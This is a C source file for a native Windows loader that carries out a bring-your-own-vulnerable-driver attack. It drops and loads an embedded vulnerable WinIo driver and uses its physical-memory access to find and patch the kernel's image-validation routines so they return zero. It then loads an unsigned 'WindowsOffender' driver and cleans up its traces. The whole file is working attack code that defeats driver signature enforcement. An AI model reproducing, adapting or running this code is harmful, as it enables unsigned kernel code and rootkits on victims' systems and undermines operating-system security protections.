/*
DriverLoader.c

The native app responsible for starting the WindowsOffender driver
*/
#include "DriverLoader.h"

PVOID g_ProcessHeap;

BYTE asmReturnZero[] =
	{
		0xB8, 0x00, 0x00, 0x00, 0x00, // mov rax, 0
		0xC3						  // ret
};

BYTE originalValidateImageData[sizeof(asmReturnZero)] = {0};
BYTE originalValidateImageHeader[sizeof(asmReturnZero)] = {0};

BYTE validateImageDataPattern[] = {0x48, 0x83, 0xEC, 0x48, 0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xD1, 0x48, 0x85, 0xC0};
BYTE validateImageHeaderPattern[] = {0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x57, 0x48, 0x81, 0xEC, 0xA0, 0x00, 0x00, 0x00, 0x33, 0xF6};

VULNERABLE_DRIVER_ENTRY vulnerableDriverList[] =
	{
		INITIALIZE_VULNERABLE_DRIVER_ENTRY(L"\\DosDevices\\WinIo", L"WINIO", NULL, NULL, WinIoReadPhysicalMemory, WinIoWritePhysicalMemory),
};

#ifdef DEBUG
int main()
#else
void NTAPI NtProcessStartup(PPEB pPeb)
#endif
{
	UNICODE_STRING windowsOffenderDriverRegistryKey = {0};
	UNICODE_STRING vulnerableDriverKeyPath = {0};
	UNICODE_STRING vulnerableDriverDeviceLinkPath = {0};

	OBJECT_ATTRIBUTES vulnerableDriverObjAttribs = {0};
	IO_STATUS_BLOCK vulnerableDriverIoStatusBlock = {0};

	PVULNERABLE_DRIVER_ENTRY pLoadedVulnerableDriver = NULL;

	HANDLE vulnerableDriverKeyHandle = NULL;
	HANDLE vulnerableDriverHandle = NULL;
	HANDLE vulnerableDriverFileHandle = NULL;
	HANDLE windowsOffenderDriverHandle = NULL;

	PVOID validateImageDataPatternAddress = NULL;
	PVOID validateImageHeaderPatternAddress = NULL;
	PVOID kernelBase = NULL;

	BOOL validateImageDataPatched = FALSE;
	BOOL validateImageHeaderPatched = FALSE;

	NTSTATUS status = STATUS_SUCCESS;

	PPEB pProcessPeb = (PPEB)__readgsqword(0x60);

	g_ProcessHeap = pProcessPeb->ProcessHeap;
	HMODULE currentModule = pProcessPeb->ImageBaseAddress;

	BOOLEAN privilegePrevEnabled;

	if (!NT_SUCCESS(RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &privilegePrevEnabled)))
	{
		dbgprintf("Failed to enable LoadDriverPrivilege\n");

		goto _NtProcessStartup_Cleanup;
	}

	RtlInitUnicodeString(
		&windowsOffenderDriverRegistryKey,
		L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\" DRIVER_NAME);

	for (size_t i = 0; i < _countof(vulnerableDriverList); i++)
	{
		BIN_RESOURCE driverImageBinResource = {0};

		// Currently we only support patching with the physical r/w routines
		if (vulnerableDriverList[i].PhysicalReadRoutine == NULL ||
			vulnerableDriverList[i].PhysicalWriteRoutine == NULL)
		{
			dbgprintf("Driver %ws has no supported r/w routines\n", vulnerableDriverList[i].DriverName);

			continue;
		}

		if (!FindModuleResource(
				currentModule,
				L"BINARY",
				vulnerableDriverList[i].DriverName,
				&driverImageBinResource))
		{
			continue;
		}

		// Write the driver image data into a file
		status = WriteBinResourceToFile(
			&driverImageBinResource,
			vulnerableDriverList[i].FullDriverFilePath,
			NULL);

		if (!NT_SUCCESS(status))
		{
			dbgprintf("Failed to write driver %ws to file\n", vulnerableDriverList[i].DriverName);

			continue;
		}

		// Add the driver to the registry services key
		status = AddVolatileDriverService(
			vulnerableDriverList->DriverRegistryKey,
			vulnerableDriverList->FullDriverFilePath,
			&vulnerableDriverKeyHandle);

		if (!NT_SUCCESS(status))
		{
			dbgprintf("Failed to add driver service %ws\n", vulnerableDriverList[i].DriverName);

			vulnerableDriverKeyHandle = NULL;

			// Delete vuln driver image
			DeleteFileByName(vulnerableDriverList[i].FullDriverFilePath);

			continue;
		}

		RtlInitUnicodeString(&vulnerableDriverKeyPath, vulnerableDriverList[i].DriverRegistryKey);

		// Try to load the vulnerable driver
		status = NtLoadDriver(&vulnerableDriverKeyPath);

		if (!NT_SUCCESS(status))
		{
			dbgprintf(
				"Failed to load vulnerable driver %ws (ntstatus: 0x%08X)\n",
				vulnerableDriverList[i].DriverName, status);

			// Delete and close vuln driver key
			NtDeleteKey(vulnerableDriverKeyHandle);
			NtClose(vulnerableDriverKeyHandle);

			// Delete vuln driver image
			DeleteFileByName(vulnerableDriverList[i].FullDriverFilePath);

			continue;
		}

		// If here, we can use the driver's r/w routines to patch the system to load the windowsoffender driver
		dbgprintf("Successfully loaded vulnerable driver %ws\n", vulnerableDriverList[i].DriverName);

		pLoadedVulnerableDriver = &vulnerableDriverList[i];

		break; // Exit loop
	}

	if (pLoadedVulnerableDriver == NULL)
	{
		dbgprintf("Failed to load any vulnerable driver\n");

		goto _NtProcessStartup_Cleanup;
	}

	// Set up structures for opening a handle to the vulnerable driver
	RtlInitUnicodeString(
		&vulnerableDriverDeviceLinkPath,
		pLoadedVulnerableDriver->DriverDeviceSymbolicLinkPath);

	InitializeObjectAttributes(
		&vulnerableDriverObjAttribs,
		&vulnerableDriverDeviceLinkPath,
		OBJ_CASE_INSENSITIVE,
		NULL,
		NULL);

	dbgprintf("Opening vulnerable driver...\n");

	if (!NT_SUCCESS(NtCreateFile(
			&vulnerableDriverHandle,
			FILE_READ_DATA | FILE_WRITE_DATA,
			&vulnerableDriverObjAttribs,
			&vulnerableDriverIoStatusBlock,
			NULL,
			FILE_ATTRIBUTE_NORMAL,
			0,
			FILE_OPEN,
			0,
			NULL,
			0)))
	{
		dbgprintf("Failed to open vulnerable driver device\n");

		goto _NtProcessStartup_Cleanup;
	}

	dbgprintf("Got handle to vulnerable driver\n");

	kernelBase = FindKernelBasePhysical(
		vulnerableDriverHandle,
		pLoadedVulnerableDriver->PhysicalReadRoutine);

	if (kernelBase == NULL)
	{
		dbgprintf("Failed to locate kernel in memory\n");

		goto _NtProcessStartup_Cleanup;
	}

	dbgprintf("Found kernel base %p\n", kernelBase);

	dbgprintf("Searching for validation routines in kernel...\n");

	// find target physical addresses for patch
	validateImageDataPatternAddress = SearchForPatternPhysical(
		vulnerableDriverHandle,
		pLoadedVulnerableDriver->PhysicalReadRoutine,
		kernelBase,
		PATTERN_SEARCH_RANGE,
		validateImageDataPattern,
		sizeof(validateImageDataPattern));

	validateImageHeaderPatternAddress = SearchForPatternPhysical(
		vulnerableDriverHandle,
		pLoadedVulnerableDriver->PhysicalReadRoutine,
		kernelBase,
		PATTERN_SEARCH_RANGE,
		validateImageHeaderPattern,
		sizeof(validateImageHeaderPattern));

	if (NULL == validateImageDataPatternAddress || NULL == validateImageHeaderPatternAddress)
	{
		dbgprintf("Failed to locate patterns\n");

		goto _NtProcessStartup_Cleanup;
	}

	// Backup the original function's data
	if (!pLoadedVulnerableDriver->PhysicalReadRoutine(
			vulnerableDriverHandle,
			validateImageDataPatternAddress,
			originalValidateImageData,
			sizeof(originalValidateImageData)))
	{
		dbgprintf("Failed to read validateImageData data\n");

		goto _NtProcessStartup_Cleanup;
	}

	if (!pLoadedVulnerableDriver->PhysicalReadRoutine(
			vulnerableDriverHandle,
			validateImageHeaderPatternAddress,
			originalValidateImageHeader,
			sizeof(originalValidateImageHeader)))
	{
		dbgprintf("Failed to read validateImageHeader data\n");

		goto _NtProcessStartup_Cleanup;
	}

	dbgprintf("Patching kernel validation routines...\n");

	// Patch both routines to return zero
	validateImageDataPatched = pLoadedVulnerableDriver->PhysicalWriteRoutine(
		vulnerableDriverHandle,
		validateImageDataPatternAddress,
		asmReturnZero,
		sizeof(asmReturnZero));

	validateImageHeaderPatched = pLoadedVulnerableDriver->PhysicalWriteRoutine(
		vulnerableDriverHandle,
		validateImageHeaderPatternAddress,
		asmReturnZero,
		sizeof(asmReturnZero));

	if(!validateImageDataPatched || !validateImageHeaderPatched)
	{
		dbgprintf("Failed to patch validation routines\n");
	}

	if (!NT_SUCCESS(NtLoadDriver(&windowsOffenderDriverRegistryKey)))
	{
		dbgprintf("Failed to load WindowsOffender Driver\n");
	}
	else
	{
		dbgprintf("Successfully loaded driver\n");
	}

_NtProcessStartup_Cleanup:

	dbgprintf("Cleaning up...\n");

	// Undo the patching
	if (validateImageDataPatched)
	{
		dbgprintf("Unpatching validateImageData...\n");
		pLoadedVulnerableDriver->PhysicalWriteRoutine(
			vulnerableDriverHandle,
			validateImageDataPatternAddress,
			originalValidateImageData,
			sizeof(originalValidateImageData));
	}

	if (validateImageHeaderPatched)
	{
		dbgprintf("Unpatching validateImageHeader...\n");
		pLoadedVulnerableDriver->PhysicalWriteRoutine(
			vulnerableDriverHandle,
			validateImageHeaderPatternAddress,
			originalValidateImageHeader,
			sizeof(originalValidateImageHeader));
	}

	if(vulnerableDriverHandle != NULL)
	{
		dbgprintf("Closing vuln driver handle...\n");
		NtClose(vulnerableDriverHandle);
	}

	if (pLoadedVulnerableDriver != NULL)
	{

		dbgprintf("Unloading vuln driver...\n");
		
		// Try to unload the vulnerable driver
		status = NtUnloadDriver(&vulnerableDriverKeyPath);

		if (!NT_SUCCESS(status))
		{
			dbgprintf("Failed to unload driver %ws full cleanup won't be possible\n", pLoadedVulnerableDriver->DriverName);
		}
		else
		{
			dbgprintf("Successfully unloaded driver %ws\n", pLoadedVulnerableDriver->DriverName);
		}

		dbgprintf("Deleting vulnerable driver image...\n");

		// Delete the vuln driver binary, this will fail if the driver failed to unload
		DeleteFileByName(pLoadedVulnerableDriver->FullDriverFilePath);
	}

	// Delete and close vuln driver key
	if (vulnerableDriverKeyHandle != NULL)
	{
		dbgprintf("Deleting vuln driver key...\n");
		NtDeleteKey(vulnerableDriverKeyHandle);
		NtClose(vulnerableDriverKeyHandle);
	}

	dbgprintf("Bye!");

	NtTerminateProcess((HANDLE)-1, 0);
}
